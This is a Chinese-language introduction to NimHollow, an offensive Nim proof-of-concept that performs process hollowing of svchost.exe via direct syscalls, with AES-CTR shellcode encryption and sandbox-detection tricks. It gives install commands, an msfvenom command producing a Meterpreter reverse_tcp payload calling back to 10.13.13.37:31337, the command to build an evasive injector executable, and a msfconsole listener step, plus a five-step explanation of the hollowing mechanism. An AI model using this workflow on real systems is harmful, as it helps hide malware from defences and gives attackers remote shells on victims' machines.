![](https://image.3001.net/images/20220106/1641471480_61d6ddf8752eb8dca9c4a.jpg!small)

## 关于NimHollow

NimHollow是一个基于Nim语言实现的[
_进程镂空_](https://attack.mitre.org/techniques/T1055/012/)技术PoC，主要利用syscall系统调用实现其功能。

Nim是一个新型的静态类型、命令式编程语言，支持过程式、函数式、面向对象和泛型编程风格而保持简单和高效。Nim从Lisp继承来的一个特殊特性--抽象语法树(AST)作为语言规范的一部分，可以用作创建领域特定语言的强大宏系统。除此之外，Nim也是一个编译型的具有垃圾收集的系统编程语言，有着极其卓越的生产/性能比

## 功能介绍

> 1、使用[ _NimlineWhispers_](https://github.com/ajpc500/NimlineWhispers)或[
> _NimlineWhispers2_](https://github.com/ajpc500/NimlineWhispers2)直接触发Windows本机API函数的系统调用。
>
> 2、 _在CTR模式下使用AES_进行Shellcode加密/解密。
>
> 3、通过@officious security从[
> _OSEP课程_](https://www.baidu.com/link?url=iETTG8R5dM_x-> aPkaOrzINB3YyAZhRDzFe4DrAxslS_Bhd62AmA67BKBFA0rXQJUb3XZfJtb-x5qWaJryOLfNq&wd=&eqid=e1244c2c0000bf3d0000000661d6d890)中获取简单的沙盒检测方法。

## 工具安装

广大研究人员可以使用下列命令将该项目源码克隆至本地，并安装好相关的依赖组件：

    
    
    ~$ git clone --recurse-submodules https://github.com/snovvcrash/NimHollow && cd NimHollow
    
    ~$ git submodule update --init --recursive
    
    ~$ nimble install winim nimcrypto
    
    ~$ pip3 install -r requirements.txt
    
    ~$ sudo apt install upx -y

## 工具使用

    
    
    ~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.13.37 LPORT=31337 EXITFUNC=thread -f raw -o shellcode.bin
    
    ~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm [--whispers2]
    
    ~$ file injector.exe
    
    injector.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
    
    ~$ sudo msfconsole -qr msf.rc

## 工具帮助信息

    
    
    usage: NimHollow.py [-h] [-i IMAGE] [-o OUTPUT] [--whispers2] [--debug] [--upx] [--rm] shellcode_bin
    
     
    
    positional arguments:
    
      shellcode_bin         原始Shellcode文件的路径
    
     
    
    optional arguments:
    
      -h, --help            显示帮助信息和退出
    
      -i IMAGE, --image IMAGE
    
                          需要执行进程镂空的目标进程 (默认为"C:\Windows\System32\svchost.exe")
    
      -o OUTPUT, --output OUTPUT
    
                          输出文件名
    
      --whispers2          使用NimlineWhispers2 生成syscalls.nim
    
      --debug             不从Nim二进制文件中获取调试信息
    
      --upx                使用upx压缩Nim二进制文件
    
      --rm                 编译代码后删除Nim文件

## NimHollow进程镂空机制

 **1、以挂起状态创建目标进程，例如svchost.exe：**

![](https://image.3001.net/images/20220106/1641471545_61d6de39d06503e34611e.png!small)

 **2、查询创建的进程以从PEB（进程环境块）提取其基址指针：**

![](https://image.3001.net/images/20220106/1641471550_61d6de3ec7182ef192220.png!small)

 **3、读取镜像基址指针指向的8字节内存（对于64位体系结构），以获取镜像基址的实际值：**

![](https://image.3001.net/images/20220106/1641471555_61d6de43f013e3d554e43.png!small)

 **4、读取已加载EXE映像的0x200字节并分析PE结构以获取入口点地址：**

![](https://image.3001.net/images/20220106/1641471561_61d6de49609401d936050.png!small)

 **5、向入口点地址写入Shellcode并恢复线程执行：**

![](https://image.3001.net/images/20220106/1641471568_61d6de502137e274e4ca0.png!small)

## 项目地址

 **NimHollow：** 【[ _GitHub传送门_](https://github.com/snovvcrash/NimHollow)】

## 参考资料

> [
> _https://github.com/ajpc500/NimlineWhispers_](https://github.com/ajpc500/NimlineWhispers)
>
> [
> _https://github.com/ajpc500/NimlineWhispers2_](https://github.com/ajpc500/NimlineWhispers2)
>
> [
> _https://github.com/byt3bl33d3r/OffensiveNim/_](https://github.com/byt3bl33d3r/OffensiveNim/)
>
> [
> _https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim_](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim)
>
> [
> _https://github.com/byt3bl33d3r/OffensiveNim/issues/16_](https://github.com/byt3bl33d3r/OffensiveNim/issues/16)
>
> [
> _https://attack.mitre.org/techniques/T1055/012/_](https://attack.mitre.org/techniques/T1055/012/)
>
> [
> _https://en.wiki*pedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)_](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_\(CTR\))

